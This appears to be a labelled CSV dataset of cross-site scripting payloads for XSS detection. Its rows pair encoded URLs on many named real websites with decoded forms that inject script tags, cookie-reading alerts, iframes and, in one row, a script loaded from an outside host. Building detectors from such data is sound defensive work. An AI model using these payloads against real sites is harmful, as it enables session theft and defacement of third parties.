Payloads,Class,decoded,executed,parser_changed
http://dataservice.eea.europa.eu/atlas/default.asp?refid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://dataservice.eea.europa.eu/atlas/default.asp?refid=""><script>alert(""maxwel"")</script>",True,True
http://uygunsevgili.com/default.asp?hat=search&amp;content=listmembers&amp;searchtype=&quot;&gt;&lt;script&gt;alert(docume<br>nt.cookie)&lt;/script&gt;,Malicious,"http://uygunsevgili.com/default.asp?hat=search&content=listmembers&searchtype=""><script>alert(document.cookie)</script>",True,True
http://www.agisweb.nl/voor_consumenten/zoekresultaat?cx=004067807135607596739%3af-p7rdiyulc&amp;cof=fori<br>d%3a11&amp;ie=utf-8&amp;view=searchresults&amp;q=&quot;&gt;&lt;script&gt;alert+('killer-tr')&lt;%2fscript&gt;'&quot;&gt;&lt;iframe+src%3dhttp:/<br>/www.reizen-ts.net/img/trk/turkije_vlag.jpg&gt;#262,Malicious,"http://www.agisweb.nl/voor_consumenten/zoekresultaat?cx=004067807135607596739:f-p7rdiyulc&cof=forid:11&ie=utf-8&view=searchresults&q=""><script>alert ('killer-tr')</script>'""><iframe src=http://www.reizen-ts.net/img/trk/turkije_vlag.jpg>#262",True,True
http://xpnd.us/index.php/&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,"http://xpnd.us/index.php/""><script>alert(1);</script>",True,True
http://www.jucky29.com/news.cgi?date=2007.10.31&amp;cal=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72<br>%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%<br>30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2<br>c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious,"http://www.jucky29.com/news.cgi?date=2007.10.31&cal="">'><script>alert(String.fromCharCode(66,121,32,107,117,115,111,109,105,115,111,46,99,111,109))</script>
",True,True
http://www.parkcityweb.com/cgi-bin/whois.cgi?fqdn=%3e%3cscript%3ealert(%22xssed+by+azat%22)%3c/scrip<br>t%3e%3e%3cscript%3ealert(%22xssed+by+azat%22)%3c/script%3e&amp;tld=.com.pl&amp;submit=fuckyou,Malicious,"http://www.parkcityweb.com/cgi-bin/whois.cgi?fqdn=><script>alert(""xssed by azat"")</script>><script>alert(""xssed by azat"")</script>&tld=.com.pl&submit=fuckyou",True,True
http://www.marinedepot.com/aquarium_additives_hagen_cycle_aqua_plus_water_conditioner_waste_control_<br>ph_chlor-x.asp?cartid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.marinedepot.com/aquarium_additives_hagen_cycle_aqua_plus_water_conditioner_waste_control_ph_chlor-x.asp?cartid=""><script>alert(""maxwel"")</script>",True,True
http://www.nbflight.com/product.asp?bigclassname=%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious,"http://www.nbflight.com/product.asp?bigclassname=<script>alert(""xss"")</script>",True,True
http://www.cora.de/advanced_search_result.php?keywords=%22%3e%3cscript%3ealert(1)%3b%3c%2fscript%3e&amp;<br>x=0,Malicious,"http://www.cora.de/advanced_search_result.php?keywords=""><script>alert(1);</script>&x=0",True,True
http://shop.ozracing.com/moda/ozracing_product_chooser.php?product_name=%22%3e'%3e%3cscript%3ealert(<br>123)%3c/script%3e%22',Malicious,"http://shop.ozracing.com/moda/ozracing_product_chooser.php?product_name="">'><script>alert(123)</script>""'",True,True
http://otd.harvard.edu/technologies/index.php?category=engineering/%20communications&amp;searchterm=%22%<br>3e%22%3e/r0hit/%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3cscript%20src=http://iblog.ir/sty<br>le.js%3e%3c/script%3e,Malicious,"http://otd.harvard.edu/technologies/index.php?category=engineering/ communications&searchterm="">"">/r0hit/><script>alert(document.cookie)</script><script src=http://iblog.ir/style.js></script>",True,True
http://learn.iis.net/themes/iis/pages/search.aspx?q=ssl%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%<br>3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://learn.iis.net/themes/iis/pages/search.aspx?q=ssl'""></title><script>alert(1337)</script>'""><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://nikola.mishev.net/gallery/mgallery/index.php?c=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://nikola.mishev.net/gallery/mgallery/index.php?c=""><script>alert(document.cookie)</script>",True,True
http://www.tm.uka.de/itm/view.php?view=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,"http://www.tm.uka.de/itm/view.php?view=""><script>alert(document.cookie)</script>",True,True
http://www.anpe.fr/espacecandidat/nicola/initialiserrecherchepartenaire.do?lieux=75d%2c69d%2c06d%2c1<br>3d%2c34d%2c14d%2c84d%2c77d%2c78d%2c91d%2c92d%2c93d%2c94d%2c95d&amp;mots=%27%22%3e%3c/title%3e%3cscript%3<br>ealert(1337)%3c/script%3e,Malicious,"http://www.anpe.fr/espacecandidat/nicola/initialiserrecherchepartenaire.do?lieux=75d,69d,06d,13d,34d,14d,84d,77d,78d,91d,92d,93d,94d,95d&mots='""></title><script>alert(1337)</script>",True,True
http://welt1.freewar.de/freewar/register.php?ref_id=0&amp;world=0&amp;email=%22%3e%3cscript%3ealert%28docume<br>nt.cookie%29%3c/script%3e,Malicious,"http://welt1.freewar.de/freewar/register.php?ref_id=0&world=0&email=""><script>alert(document.cookie)</script>",True,True
http://www.netzwerk-wirtschaft.de/portal/include.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.netzwerk-wirtschaft.de/portal/include.php?path=""><script>alert(document.cookie)</script>",True,True
http://www.chinatianci.cn/gs-t.asp?ch=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.chinatianci.cn/gs-t.asp?ch=""><script>alert(""maxwel"")</script>",True,True
http://www.gsmtrack.nl/index.php?page=navi_merken&amp;action=navigatie&amp;id=%27%22%3e%3c/title%3e%3cscript<br>%3ealert%281337%29%3c/script%3e,Malicious,"http://www.gsmtrack.nl/index.php?page=navi_merken&action=navigatie&id='""></title><script>alert(1337)</script>",True,True
http://web.deu.edu.tr/defot/resim.php?sergi=zd&amp;resim=%22%3e%3cscript%3ealert(1)%3c/script%3e,Malicious,"http://web.deu.edu.tr/defot/resim.php?sergi=zd&resim=""><script>alert(1)</script>",True,True
http://search.msn.com.sg/results.aspx?q=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://search.msn.com.sg/results.aspx?q=""><script>alert(document.cookie)</script>",True,True
http://city.ask.com/videosmask?maskurl=http://www.xssed.com/archive/author=azat%20harutyunyan;&amp;o=%22<br>%3cscript%3ealert%28%22xssed%22%29%3c/script%3e&amp;l=dir,Malicious,"http://city.ask.com/videosmask?maskurl=http://www.xssed.com/archive/author=azat harutyunyan;&o=""<script>alert(""xssed"")</script>&l=dir",True,True
http://home.miryang.go.kr/x/asp/board/board.asp?board_idx=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://home.miryang.go.kr/x/asp/board/board.asp?board_idx=""><script>alert(""maxwel"")</script>",True,True
http://gardiyan.net//directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,"http://gardiyan.net//directory.php?cat=""><script>alert(document.cookie)</script>",True,True
http://miss.rambler.ru/srch/?sort=0&amp;set=miss&amp;words=&quot;&gt;&lt;script&gt;alert('the_miller')&lt;/script&gt;,Malicious,"http://miss.rambler.ru/srch/?sort=0&set=miss&words=""><script>alert('the_miller')</script>",True,True
http://www.paperon.net/index.php?setdate=200710%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%2<br>8%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37<br>%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%<br>39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious,"http://www.paperon.net/index.php?setdate=200710"">'><script>alert(String.fromCharCode(66,121,32,107,117,115,111,109,105,115,111,46,99,111,109))</script>
",True,True
http://www.moviefone.com/new-movie-releases?locationquery=%3cscript%3ealert(%27xss%20by%20bho%27);%2<br>0document.body.innerhtml=%27xss%20by%20bho%27;%3c/script%3e,Malicious,http://www.moviefone.com/new-movie-releases?locationquery=<script>alert('xss by bho'); document.body.innerhtml='xss by bho';</script>,True,True
http://wsm.wsu.edu/s/index.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281337%29%3c/script%3e,Malicious,"http://wsm.wsu.edu/s/index.php?id='""></title><script>alert(1337)</script>",True,True
http://www.qut.edu.au/about/servdirect/index.jsp?serviceid=qid.1vdydsec.2.ziaarb.299&amp;name=document%2<br>0delivery%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%2<br>0xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.qut.edu.au/about/servdirect/index.jsp?serviceid=qid.1vdydsec.2.ziaarb.299&name=document delivery'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
<embed src=javascript:alert(1)>,Malicious,<embed src=javascript:alert(1)>,True,True
http://www.europa-eu-un.org/home/articleslist.asp?=&quot;&gt;&lt;script&gt;alert(&quot;bluemax&quot;)&lt;/script&gt;,Malicious,"http://www.europa-eu-un.org/home/articleslist.asp?=""><script>alert(""bluemax"")</script>",True,True
http://mybasvuru.com/basvurutamamlandi_mybasvuru.asp?ref=&lt;body bgcolor=black&gt;&lt;iframe width=&quot;800&quot;<br>height=&quot;500&quot; src=&quot;http://gamil.net.tc&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(/gamilnetprotection/)&lt;/script&gt;,Malicious,"http://mybasvuru.com/basvurutamamlandi_mybasvuru.asp?ref=<body bgcolor=black><iframe width=""800""height=""500"" src=""http://gamil.net.tc""></iframe><script>alert(/gamilnetprotection/)</script>",True,True
http://www.dlink.es/cs/satellite?c=page&amp;childpagename=dlinkeurope-es%2fdlgeneric&amp;cid=1197370344419&amp;p<br>=1197370344419&amp;packedargs=category%3dquickproductfinder%26locale%3d1195806681347%26renderstyle%3derr<br>orproductsearch%26term%3d%253cscript%253ealert%2528document.cookie%2529%253c%252fscript%253e&amp;pagenam<br>e=dlinkeurope-es%2fdlwrapper,Malicious,http://www.dlink.es/cs/satellite?c=page&childpagename=dlinkeurope-es/dlgeneric&cid=1197370344419&p=1197370344419&packedargs=category=quickproductfinder&locale=1195806681347&renderstyle=errorproductsearch&term=<script>alert(document.cookie)</script>&pagename=dlinkeurope-es/dlwrapper,True,True
http://www.romantikpartner.com/member/online_list.php?view_mode=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.romantikpartner.com/member/online_list.php?view_mode=""><script>alert(""backdoor"")</script>",True,True
<img%09onerror=alert(1) src=a>,Malicious,<img	onerror=alert(1) src=a>,True,True
http://www.websense.com/attachments/image.ashx?--%3e%3cscript%3ealert(1);//=%3c/script%3e,Malicious,http://www.websense.com/attachments/image.ashx?--><script>alert(1);//=</script>,True,True
http://www.loveburned.net/shutter/shudder/index.php?c=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.loveburned.net/shutter/shudder/index.php?c=""><script>alert(document.cookie)</script>",True,True
http://center.uoregon.edu/iste/necc2007/exhibitors/floorplan/exhib_alpha_list.php?_namechar=&quot;&gt;&lt;scrip<br>t&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://center.uoregon.edu/iste/necc2007/exhibitors/floorplan/exhib_alpha_list.php?_namechar=""><script>alert(""maxwel"")</script>",True,True
"http://search.hccg.gov.tw/irms22/samplekits_std_jsp/demo_files_search_ch.jsp?author=&amp;encode=&amp;filedat<br>e1=&amp;filedate2=&amp;filename=&amp;filepath=&amp;filesize=&amp;filetype=&amp;title=&amp;a=10&amp;o=&amp;oa=1&amp;p=%e7%b6%b2%e5%9d%80&amp;s=po<br>stdb%2cpiecedb%2chccgweb%2cweb1%27,%27%27,%27%27,%27res%27,%2733%27,%27%27)%27%22%3e%3c/title%3e%3cs<br>cript%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee<br>%3e",Malicious,"http://search.hccg.gov.tw/irms22/samplekits_std_jsp/demo_files_search_ch.jsp?author=&encode=&filedate1=&filedate2=&filename=&filepath=&filesize=&filetype=&title=&a=10&o=&oa=1&p=網址&s=postdb,piecedb,hccgweb,web1','','','res','33','')'""></title><script>alert(1337)</script>'""><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.msgpluslive.ee/changelang.php?setlangcookie=&quot;&gt;%3cscript%3ealert%28%27live+is+hacked+by+ha<br>ri%27%29%3c%2fscript%3e%3cbody+bgcolor%3d%22black%22%3e%3ccenter%3e%3c%2fcenter%3e%3cmarquee%3e%3cce<br>nter%3e+%3cfont+size%3d%2244%22+color%3d%22red%22%3ethe+live+%20is+xss3d+by+hari(topsecure.net)%3c%2<br>ffont%3e%3c%2fcenter%3e%3c%2fmarquee%3e%3cbody&amp;site=default&amp;btng.x=0&amp;btng.y=0&amp;btng=search&amp;sort=date%<br>3ad%3al%3ad1&amp;output=xml_no_dtd&amp;ie=utf-8&amp;client=default_frontend&amp;btng.y=0&amp;btng.y=0&amp;btng.x=0&amp;btng.x=0&amp;<br>oe=utf-8&amp;proxystylesheet=default_frontend&amp;lang=th&amp;redirect=www.msgpluslive.net%2ffeatures%2f%3flang%<br>3dth,Malicious,"http://www.msgpluslive.ee/changelang.php?setlangcookie=""><script>alert('live is hacked by hari')</script><body bgcolor=""black""><center></center><marquee><center> <font size=""44"" color=""red"">the live  is xss3d by hari(topsecure.net)</font></center></marquee><body&site=default&btng.x=0&btng.y=0&btng=search&sort=date:d:l:d1&output=xml_no_dtd&ie=utf-8&client=default_frontend&btng.y=0&btng.y=0&btng.x=0&btng.x=0&oe=utf-8&proxystylesheet=default_frontend&lang=th&redirect=www.msgpluslive.net/features/?lang=th",True,True
http://web4.internet.gov.sg/scripts/judiciary/subct/search.asp?target=&quot;&gt;&lt;script&gt;alert(&quot;cyber&quot;)&lt;/scri<br>pt&gt;,Malicious,"http://web4.internet.gov.sg/scripts/judiciary/subct/search.asp?target=""><script>alert(""cyber"")</script>",True,True
http://www.riverbendhills.com/?pg=asdf%3cscript%3ealert(1337)%3c/script%3e&amp;frame=1,Malicious,http://www.riverbendhills.com/?pg=asdf<script>alert(1337)</script>&frame=1,True,True
http://www.remoteexecution.net/bin/index.php?q=%3cscript%3ealert%28%2fxss%2f%29%3b%3c%2fscript%3e&amp;q_<br>type=sx&amp;domain_name=remoteexecution.net&amp;token=wlwszu2slvokewjtop_tgqcsahueqhukhtdsxn4qahgdiaawivcgaz<br>gnuirwoanq5nrecq,Malicious,http://www.remoteexecution.net/bin/index.php?q=<script>alert(/xss/);</script>&q_type=sx&domain_name=remoteexecution.net&token=wlwszu2slvokewjtop_tgqcsahueqhukhtdsxn4qahgdiaawivcgazgnuirwoanq5nrecq,True,True
http://www.jsecode.com/product.asp?bigclassname=%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious,"http://www.jsecode.com/product.asp?bigclassname=<script>alert(""xss"")</script>",True,True
http://www.softwarevault.info/signinform.php?msg=%3cscript%3ealert(/xssed/)%3c%2fscript%3e,Malicious,http://www.softwarevault.info/signinform.php?msg=<script>alert(/xssed/)</script>,True,True
http://www.washingtonchinareview.org/newsdetail.php?id=%27%27%22%3e%3c/title%3e%3cscript%3ealert%281<br>337%29%3c/script%3e,Malicious,"http://www.washingtonchinareview.org/newsdetail.php?id=''""></title><script>alert(1337)</script>",True,True
http://www.ligattsecurity.com/?s=%3cscript%3ealert%28%22yeah...%20i%20learned%20to%20hack%20online%2<br>2%29%3c/script%3e&amp;submit.x=0&amp;submit.y=0,Malicious,"http://www.ligattsecurity.com/?s=<script>alert(""yeah... i learned to hack online"")</script>&submit.x=0&submit.y=0",True,True
isitsearch=search&search_data=&srchtype=profile&searchq=%22%3e%3ciframe+src%3d%22javascript%3aalert% 28%27xssed_by_r007k17+a.k.a+raghavendra+karthik+d%27%29%3b%22%3e%3c%2fiframe%3e,Malicious,"isitsearch=search&search_data=&srchtype=profile&searchq=""><iframe src=""javascript:alert% 28'xssed_by_r007k17 a.k.a raghavendra karthik d');""></iframe>",True,True
http://www.kaspersky.dk/soeg.php?words=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+nar<br>coticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.kaspersky.dk/soeg.php?words=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.jeuxvideo-flash.com/signaler.php?signaler_page=&quot;&gt;&lt;script&gt;alert(/maxwel/)&lt;/script&gt;,Malicious,"http://www.jeuxvideo-flash.com/signaler.php?signaler_page=""><script>alert(/maxwel/)</script>",True,True
http://www.gog.com/en/search/sort/search/%22&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.gog.com/en/search/sort/search/""><script>alert(document.cookie)</script>",True,True
http://www.campimagination.org/2004/week2/gallery/login.asp?folder=arrival&amp;n=&quot;&gt;&lt;script&gt;alert(documen<br>t.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.campimagination.org/2004/week2/gallery/login.asp?folder=arrival&n=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.because.tv/news/news.php?mn=1&amp;mx=10&amp;dv=10%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/<br>script%3e,Malicious,"http://www.because.tv/news/news.php?mn=1&mx=10&dv=10'""></title><script>alert(1337)</script>",True,True
http://search.lilly.com/search_result.jsp?querytext=%22%3e%27%3cscript%3ealert%28%27i-landet__turkey<br>__cyber_saboatge%27%29%3c%2fscript%3e&amp;query=natural&amp;maxdocs=50&amp;resultcount=10&amp;querystartyear=year&amp;sc<br>ope=lilly&amp;scope=&amp;resultstart=1&amp;viewtemplate=docread.jsp&amp;sectionname=search&amp;coll=&amp;adv=y&amp;summaries=1&amp;s<br>ortspec=score&amp;order=asc&amp;querystartmonth=01&amp;queryendmonth=12&amp;queryendyear=year,Malicious,"http://search.lilly.com/search_result.jsp?querytext="">'<script>alert('i-landet__turkey__cyber_saboatge')</script>&query=natural&maxdocs=50&resultcount=10&querystartyear=year&scope=lilly&scope=&resultstart=1&viewtemplate=docread.jsp§ionname=search&coll=&adv=y&summaries=1&sortspec=score&order=asc&querystartmonth=01&queryendmonth=12&queryendyear=year",True,True
"http://ed-pharmarx.com/search.php?search_text=/""><script>alert(1)</script>&i1.x=12&i1.y=14",Malicious,"http://ed-pharmarx.com/search.php?search_text=/""><script>alert(1)</script>&i1.x=12&i1.y=14",True,True
http://www.ddl2.com/search.php?q=%22%3e%3c/script%3e%3cscript%3ealert(/xssed_by_omeha/);%3c/script%3<br>e,Malicious,"http://www.ddl2.com/search.php?q=""></script><script>alert(/xssed_by_omeha/);</script>",True,True
https://www.domaintools.com/members/payment-options.html?a=newcc&amp;r=%22%3e%3cscript%3ealert(%22siktir<br>in%20gidin%20a.q%20reverse%20ip%20paral%fdym%fd%fe%22)%3c/script%3e,Malicious,"https://www.domaintools.com/members/payment-options.html?a=newcc&r=""><script>alert(""siktirin gidin a.q reverse ip paral�ym��"")</script>",True,True
http://www.nordkeyboards.com/main.asp?tm=products&amp;clpm=nord_stage_2&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;,Malicious,"http://www.nordkeyboards.com/main.asp?tm=products&clpm=nord_stage_2""><script>alert(document.cookie)</script>",True,True
http://vietvodao.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/<br>h1&gt;&lt;/marquee&gt;,Malicious,"http://vietvodao.de/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://just-in.co.uk/forum/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious,"http://just-in.co.uk/forum/philboard_search.asp?searchterms=""><script>alert(document.cookie)</script><h1>www.raptr.us.tc</h1>",True,True
